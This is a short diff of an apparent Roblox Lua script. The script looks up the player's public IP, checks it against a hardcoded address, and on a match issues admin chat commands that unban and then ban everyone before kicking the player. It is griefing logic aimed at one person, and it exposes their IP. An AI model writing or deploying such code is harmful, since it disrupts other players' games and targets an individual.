@@ -2,6 +2,7 @@ local ipblacklist = "89.243.124.237"
 local findip = tostring(game:HttpGet("https://api.ipify.org", true))
 if findip == ipblacklist then
     game.Players:Chat("!unban all")
+    wait(.4)
     game.Players:Chat("!ban all")
     wait(30)
     game.Players.LocalPlayer:Kick("89.243.124.237")
